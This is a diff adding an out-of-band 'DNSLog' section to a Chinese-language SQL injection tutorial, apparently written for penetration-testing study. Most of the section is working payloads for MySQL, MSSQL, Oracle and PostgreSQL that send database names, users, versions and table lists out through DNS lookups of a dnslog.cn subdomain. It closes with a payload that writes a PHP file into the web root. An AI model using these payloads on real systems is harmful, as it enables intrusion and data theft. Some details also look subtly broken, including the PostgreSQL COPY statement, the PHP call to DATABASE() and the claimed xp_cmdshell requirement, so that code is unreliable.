@@ -14,6 +14,7 @@
 10. [不同数据库的注入差异](#不同数据库的注入差异)
 11. [SQL 注入防御](#sql-注入防御)
 12. [实战练习资源](#实战练习资源)
+13. [DNSLog 带外注入](#0x11-dnslog-带外注入out-of-band)
 
 ---
 
@@ -1079,6 +1080,117 @@ WAF 可以被绕过，且无法防御二次注入。
 | **SQLMap** | 自动化 SQL 注入检测和利用工具，支持几乎所有数据库和注入类型 |
 | **Burp Suite** | 功能强大的 Web 渗透测试工具，可拦截、修改和分析 HTTP 请求 |
 | **HackBar** | 浏览器插件，方便手动构造和发送 SQL 注入 payload |
+
+### 0x11 DNSLog 带外注入（Out-of-Band）
+
+**原理**：当页面没有任何输出回显（无论 True/False 页面都相同），且时间盲注也无法使用时，可以借助 DNS 解析日志来外传数据。攻击者让数据库向自己控制的域名发起 DNS 请求，数据被编码在域名中，通过 DNS 查询记录被记录下来。
+
+**适用场景**：
+- 页面无回显、无布尔差异、无法使用时间盲注
+- 数据库支持发起网络请求（如 MySQL 的 `LOAD_FILE()`、MSSQL 的 `xp_dirtree`、Oracle 的 `UTL_HTTP`）
+- 当前用户有相应权限
+
+#### 工作流程
+
+```
+攻击者                   目标服务器                DNS Server (dnslog.cn)
+  │                         │                          │
+  │  注入 payload ──────────→                          │
+  │  如: LOAD_FILE(CONCAT('\\', query, '.xxx.dnslog.cn\a'))
+  │                         │                          │
+  │                         │──── DNS 查询 ──────────→│
+  │                         │    (数据编码在域名中)      │
+  │                         │                          │
+  │  ←── 查看 DNS 解析记录 ──────────────────────────  │
+```
+
+#### 常用 DNSLog 平台
+
+| 平台 | 地址 | 说明 |
+|-----|------|------|
+| **CEYE** | [http://ceye.io](http://ceye.io) | 国内常用，支持 DNS 和 HTTP |
+| **DNSLog.cn** | [http://dnslog.cn](http://dnslog.cn) | 轻量级，无需注册 |
+| **Burp Collaborator** | Burp Suite 自带 | 专业版功能 |
+
+#### MySQL DNSLog 注入
+
+MySQL 利用 `LOAD_FILE()` 函数发起 UNC 路径请求来触发 DNS 查询。
+
+**前提条件**：
+- MySQL 用户有 `FILE` 权限
+- **Windows 系统**（Linux 下 `LOAD_FILE` 不触发 UNC 请求）
+- `secure_file_priv` 未限制 LOAD_FILE
+
+```sql
+-- 获取当前数据库名
+id=1 AND LOAD_FILE(CONCAT('\\\\', DATABASE(), '.xxxx.dnslog.cn\\a'))
+
+-- 获取当前用户
+id=1 AND LOAD_FILE(CONCAT('\\\\', USER(), '.xxxx.dnslog.cn\\a'))
+
+-- 获取数据库版本
+id=1 AND LOAD_FILE(CONCAT('\\\\', @@VERSION, '.xxxx.dnslog.cn\\a'))
+```
+
+**解释**：在 Windows 中，`\\host\share` 格式的路径会触发 SMB 协议，Windows 会尝试解析 `host` 的 DNS 名称。将查询结果拼接到域名中，DNSLog 平台就会记录下包含数据的 DNS 查询。
+
+**带子查询的完整示例**：
+
+```sql
+id=1 AND LOAD_FILE(CONCAT('\\\\',
+  (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES
+   WHERE TABLE_SCHEMA='security'),
+'.xxxx.dnslog.cn\\test'))
+```
+
+#### MSSQL DNSLog 注入
+
+SQL Server 提供了多种方式来触发 DNS 请求：
+
+```sql
+-- 方式1：xp_dirtree（需要 xp_cmdshell 权限）
+id=1; DECLARE @host varchar(1024);
+SELECT @host = CONCAT((SELECT db_name()), '.xxxx.dnslog.cn');
+EXEC('master..xp_dirtree "\\' + @host + '\a"');
+
+-- 方式2：xp_fileexist
+id=1; DECLARE @host varchar(1024);
+SELECT @host = CONCAT((SELECT db_name()), '.xxxx.dnslog.cn');
+EXEC('master..xp_fileexist "\\' + @host + '\a"');
+```
+
+#### Oracle DNSLog 注入
+
+Oracle 通过 `UTL_HTTP` 或 `UTL_INADDR` 发起网络请求：
+
+```sql
+-- 使用 UTL_HTTP（需要网络权限）
+id=1 AND UTL_HTTP.REQUEST('http://' || (SELECT banner FROM v$version WHERE rownum=1) || '.xxxx.dnslog.cn') = 1
+
+-- 使用 UTL_INADDR.GET_HOST_ADDRESS
+id=1 AND UTL_INADDR.GET_HOST_ADDRESS('' || (SELECT banner FROM v$version WHERE rownum=1) || '.xxxx.dnslog.cn') = 1
+```
+
+#### PostgreSQL DNSLog 注入
+
+PostgreSQL 没有直接的 DNS 请求函数，但可以通过 COPY 命令实现：
+
+```sql
+-- 需要超级用户权限
+DROP TABLE IF EXISTS dns;
+CREATE TABLE dns (data text);
+COPY dns FROM '\\' || (SELECT current_database()) || '.xxxx.dnslog.cn\a';
+```
+
+#### Linux 环境下的替代方案
+
+Linux 下 `LOAD_FILE` 不会触发 UNC 请求，可通过 HTTP 请求外传数据：
+
+```sql
+-- 使用 INTO OUTFILE 写入文件（需要 FILE 权限）
+id=1 UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/dns.php'
+LINES TERMINATED BY '<?php file_get_contents("http://xxxx.dnslog.cn/" . DATABASE());?>'
+```
 
 ---
 
